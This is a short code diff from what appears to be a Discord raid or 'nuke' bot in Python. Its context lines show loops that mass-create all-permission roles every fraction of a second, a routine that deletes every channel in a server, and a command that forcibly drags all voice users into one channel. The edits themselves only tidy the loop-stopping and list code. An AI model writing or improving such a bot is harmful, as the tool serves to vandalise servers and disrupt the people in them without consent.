@@ -24,7 +24,7 @@ async def mexloop(ctx):
     try: await ctx.guild.create_role(name="Mex", permissions=discord.Permissions().all(), colour=discord.Colour(0xf1c40f), hoist=True)
     except discord.HTTPException:
         await ctx.send("mex machine broke, stopping")
-        self.cancel()
+        mexloop.stop()
 
 @tasks.loop(seconds=0.1)
 async def channelingloop(ctx):
@@ -61,13 +61,10 @@ class administrator(commands.Cog):
             try: await channels.delete()
             except Exception: pass
 
-        print(ctx.guild.name + " has been wiped.")
-
     @commands.command()
     async def clump(self, ctx):
         """Clump everyone into one voice channel."""
-        connected = [member for member in ctx.guild.members if member.voice != None]
-        for members in connected:
+        for members in [member for member in ctx.guild.members if member.voice != None]:
             try: await members.edit(voice_channel=ctx.author.voice.channel)
             except Exception: pass
 
